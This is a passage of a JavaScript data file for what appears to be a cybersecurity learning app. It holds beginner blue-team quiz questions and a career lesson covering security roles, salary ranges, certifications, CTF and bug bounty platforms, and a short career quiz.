          { id: 'btq1', question: 'Windows Event ID 4625 means:', options: ['Successful login', 'Failed login', 'User created', 'Password changed'], correctIndex: 1, explanation: '4625 is a failed login attempt. Many 4625s in a short time = brute force. SIEM raises an alert at >10 attempts per minute.' },
          { id: 'btq2', question: 'What is MITRE ATT&CK?', options: ['An antivirus', 'A knowledge base of real attacker techniques', 'A port scanner', 'An encryption protocol'], correctIndex: 1, explanation: 'MITRE ATT&CK is a matrix of real techniques from investigated incidents. Helps Blue Teams know what to look for.' },
          { id: 'btq3', question: 'A hacker set up a cron job running every minute. What is the FIRST action?', options: ['Reboot the server', 'Isolate the host from the network', 'Delete the cron file', 'Change passwords'], correctIndex: 1, explanation: 'First: containment — isolate the host, cut the C2 connection. Then remove the malware. Rebooting may destroy evidence in RAM.' },
        ],
      },
    ],
  },

  {
    id: 'career-track', order: 8,
    title: 'Cybersecurity Career',
    subtitle: 'Certs, Roles & Path',
    icon: '🚀', color: '#10b981',
    difficulty: 'intermediate', xpReward: 300,
    requiresStage: 'blue-team',
    description: 'Career paths, salaries, certifications, and how to land your first job.',
    skills: ['CompTIA Security+', 'CEH', 'OSCP', 'CTF', 'Bug Bounty'],
    lessons: [
      {
        id: 'career-l1', title: 'Career Paths & Salaries', duration: 12, type: 'theory',
        content: `# Cybersecurity Career

## Roles & Salaries (2025, Global Average)

### 🔴 Red Team
\`\`\`
Junior Pentester     → $60–90K / year
Penetration Tester   → $90–130K / year
Senior Red Team      → $130–200K / year
\`\`\`

### 🔵 Blue Team
\`\`\`
SOC Analyst L1       → $55–75K / year
SOC Analyst L2/L3    → $75–110K / year
Incident Responder   → $90–140K / year
Threat Hunter        → $110–160K / year
\`\`\`

### 🟣 Specializations
\`\`\`
AppSec Engineer      → $100–160K / year
Cloud Security       → $120–180K / year
CISO                 → $180–350K / year
\`\`\`

## Certification Roadmap

\`\`\`
Start
  ↓
CompTIA Security+     ← first security cert
  ↓
    Red Team          Blue Team
    eJPT / PNPT       SOC Level 1
    CEH               CySA+
    OSCP ★            GCIH
  ↓
Senior: CRTO, OSCE3, CISSP
\`\`\`

**OSCP** — the gold standard for pentesters. A 24-hour hands-on exam.

## Start Practicing NOW (Free)

### CTF Platforms:
\`\`\`
TryHackMe.com   ← best for beginners
HackTheBox.com  ← realistic machines
PicoCTF         ← great for students
\`\`\`

### Bug Bounty:
\`\`\`
HackerOne.com
Bugcrowd.com
Google → up to $150,000 for critical bugs
Meta   → up to $50,000
\`\`\`

## What You Need for Your First Job

\`\`\`
✓ CompTIA Security+ (or equivalent)
✓ TryHackMe / HackTheBox profile
✓ GitHub with projects and scripts
✓ 1–2 Bug Bounty reports
✓ Linux and basic Python knowledge
✓ Ability to explain both an attack and a defense
\`\`\``,
      },
      {
        id: 'career-quiz', title: 'Quiz: Career', duration: 5, type: 'quiz',
        quiz: [
          { id: 'caq1', question: 'Which certification is the gold standard for pentesters?', options: ['CEH', 'OSCP', 'CompTIA Security+', 'CISM'], correctIndex: 1, explanation: 'OSCP (Offensive Security) is the most respected pentesting certification. It is a 24-hour practical exam on real machines. Employers look for it first.' },
          { id: 'caq2', question: 'CTF (Capture The Flag) is:', options: ['Military exercises', 'Hacking competitions in a legal environment', 'A type of virus', 'A backup method'], correctIndex: 1, explanation: 'CTFs are competitions where you hack intentionally vulnerable systems. Legal and educational. TryHackMe and HackTheBox are the best platforms.' },
          { id: 'caq3', question: 'Bug Bounty programs:', options: ['Are illegal', 'Pay researchers for responsibly reporting vulnerabilities', 'Only for large companies', 'Require OSCP'], correctIndex: 1, explanation: 'Bug Bounty programs reward security researchers for responsibly disclosing vulnerabilities. Great for building a portfolio and earning money.' },
        ],
      },
    ],
  },
];
